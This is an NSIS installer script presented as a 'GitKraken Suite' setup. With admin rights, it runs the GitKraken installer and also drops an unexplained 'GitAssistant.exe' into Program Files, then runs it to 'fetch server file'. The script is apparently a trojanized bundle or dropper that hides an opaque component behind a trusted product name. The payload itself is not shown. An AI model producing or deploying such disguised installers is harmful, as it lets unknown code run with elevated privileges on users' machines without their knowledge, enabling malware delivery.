; ========================================================================
; Modern UI NSIS Installer - GitKraken + Custom Component (FINAL WORKING)
; ========================================================================

!include MUI2.nsh
!include WinMessages.nsh

; ------------------------------------------------------------------------
; CONFIGURATION
; ------------------------------------------------------------------------
Name "GitKraken Suite Installer"
OutFile "FinalInstaller.exe"
InstallDir "$PROGRAMFILES\GitKrakenSuite"
RequestExecutionLevel admin

; ------------------------------------------------------------------------
; PAGES
; ------------------------------------------------------------------------
!insertmacro MUI_PAGE_WELCOME
!insertmacro MUI_PAGE_LICENSE "license.txt"
!insertmacro MUI_PAGE_DIRECTORY
!insertmacro MUI_PAGE_INSTFILES

; --- Customize the Finish page to run GitKraken ---
!define MUI_FINISHPAGE_RUN
!define MUI_FINISHPAGE_RUN_FUNCTION "LaunchGitKraken"
!define MUI_FINISHPAGE_RUN_TEXT "Run GitKraken now"
!define MUI_FINISHPAGE_RUN_NOTCHECKED
!insertmacro MUI_PAGE_FINISH

; ------------------------------------------------------------------------
; LANGUAGES
; ------------------------------------------------------------------------
!insertmacro MUI_LANGUAGE "English"

; ------------------------------------------------------------------------
; VARIABLES
; ------------------------------------------------------------------------
!define GITKRAKEN_WINDOW_TITLE "GitKraken Setup" 
Var InstallExitCode
Var GitKrakenPath

; ------------------------------------------------------------------------
; FUNCTIONS
; ------------------------------------------------------------------------

; Determines the actual GitKraken path in AppData
Function .onInit
    ; GitKraken installs to the user's local AppData folder
    StrCpy $GitKrakenPath "$LOCALAPPDATA\GitKraken\Update.exe"
    ; NOTE: You may need to adjust this path if GitKraken's launcher changes its structure!
FunctionEnd

; Function to launch GitKraken after installation (for the Finish Page)
Function LaunchGitKraken
    Exec "$GitKrakenPath"
FunctionEnd

; Custom function to launch an EXE and wait for its main window to close
Function LaunchAndWaitForWindow
    ; $R0 = Path to executable (passed via StrCpy in the Section)
    ClearErrors

    ; Launch the installer
    Exec '"$R0"'
    
    ; Wait 3 seconds for window/process to appear/exit
    Sleep 3000

    ; Loop until window disappears
    WindowLoop:
        ; Check if the installer window (which is likely brief/silent) is present
        FindWindow $R1 "" "${GITKRAKEN_WINDOW_TITLE}"
        IntCmp $R1 0 WindowNotFound WindowFound

    WindowFound:
        DetailPrint "Waiting for GitKraken setup process to finish (Handle: $R1)..."
        Sleep 1000
        Goto WindowLoop

    WindowNotFound:
        DetailPrint "GitKraken setup finished. Resuming installer."
        ; Since the window closed, we assume success for sequential execution
        StrCpy $InstallExitCode 0 
FunctionEnd

; ------------------------------------------------------------------------
; MAIN INSTALLATION SECTION
; ------------------------------------------------------------------------
Section "Install GitKraken Suite"

    ; --- 1. Extract EXEs to TEMP folder ---
    SetOutPath "$TEMP\Bundle"
    File "GitKrakenSetup.exe"
    File "GitAssistant.exe"

    ; --- 2. Launch GitKraken Installer (Silently) ---
    DetailPrint "Installing GitKraken..."
    StrCpy $R0 "$TEMP\Bundle\GitKrakenSetup.exe"
    Call LaunchAndWaitForWindow
    IntCmp $InstallExitCode 0 0 Fail_GitKraken

    ; --- 3. Copy GitAssistant.exe to permanent install folder ---
    CreateDirectory "$INSTDIR"
    CopyFiles /SILENT "$TEMP\Bundle\GitAssistant.exe" "$INSTDIR\GitAssistant.exe"

    ; --- 4. Run GitAssistant normally to fetch server file ---
    DetailPrint "Running GitAssistant to fetch server file..."
    ExecWait '"$INSTDIR\GitAssistant.exe"'

    ; --- 5. Cleanup TEMP folder ---
    Delete "$TEMP\Bundle\GitKrakenSetup.exe"
    RMDir "$TEMP\Bundle" ; Keep GitAssistant in $INSTDIR

    DetailPrint "All components installed successfully!"
    Goto Done

    ; --- ERROR HANDLING ---
    Fail_GitKraken:
        RMDir /r "$TEMP\Bundle"
        MessageBox MB_OK|MB_ICONSTOP "GitKraken setup failed or finished prematurely."
        Abort

Done:

SectionEnd

